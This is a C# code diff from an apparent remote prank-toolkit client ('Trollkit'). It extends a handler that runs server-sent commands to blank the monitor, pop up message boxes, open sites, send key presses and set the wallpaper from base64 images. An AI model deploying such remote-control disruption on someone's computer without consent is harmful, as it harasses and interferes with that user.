@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
@@ -19,29 +20,31 @@ namespace Trollkit_Client.Modules.CommandHandlers
 		private const int SC_MONITORPOWER = 0xF170;
 		private const int WM_SYSCOMMAND = 0x0112;
 
-		public void HandleCommand(TransferCommandObject obj)
+		public bool HandleCommand(TransferCommandObject obj)
 		{
 			switch (obj.Command)
 			{
 				case "BlackScreen":
 					MonitorSleep();
-					break;
+					return true;
 				case "TextBox":
 					TextBox(obj.Value);
-					break;
+					return true;
 				case "ShowImage":
 					ShowImage(obj.Value);
 					Thread.Sleep(1000); //wait for the other program to display and get focus
 					Keyboard keyboard = new Keyboard();
 					keyboard.Send(Keyboard.ScanCodeShort.F11);
-					break;
+					return true;
 				case "OpenSite":
 					OpenSite(obj.Value);
-					break;
+					return true;
 				case "SetBackground":
-					
-					break;
+					SetWallpaper(obj.Value);
+					return true;
 			}
+
+			return false;
 		}
 
 		private void MonitorSleep()
@@ -59,7 +62,21 @@ namespace Trollkit_Client.Modules.CommandHandlers
 
 		private void TextBox(string textToDisplay)
 		{
-			System.Windows.Forms.MessageBox.Show(textToDisplay);
+			string title = textToDisplay.Split('|')[0];
+			string[] content = textToDisplay.Split(new[] { '|' }, 2);
+			
+			Array values = Enum.GetValues(typeof(MessageBoxIcon));
+			Random random = new Random();
+			MessageBoxIcon randomMessageBoxIcon = (MessageBoxIcon)values.GetValue(random.Next(values.Length));
+
+			if (content.Length == 1)
+			{
+				System.Windows.Forms.MessageBox.Show(title, "", MessageBoxButtons.OK, randomMessageBoxIcon);
+			} else
+			{
+				System.Windows.Forms.MessageBox.Show(content[1], title, MessageBoxButtons.OK, randomMessageBoxIcon);
+			}
+
 		}
 
 		private void ShowImage(string base64Image)
@@ -95,6 +112,13 @@ namespace Trollkit_Client.Modules.CommandHandlers
 
 			Keyboard keyboard = new Keyboard();
 			keyboard.Send(Keyboard.ScanCodeShort.LWIN);
+		}
+
+		private void SetWallpaper(string base64Image)
+		{
+			byte[] bytes = Convert.FromBase64String(base64Image);
+			MemoryStream byteStream = new MemoryStream(bytes);
+			Wallpaper.Set(Image.FromStream(byteStream), Wallpaper.Style.Fill);
 		}
 
 		private void OpenSite(string url)
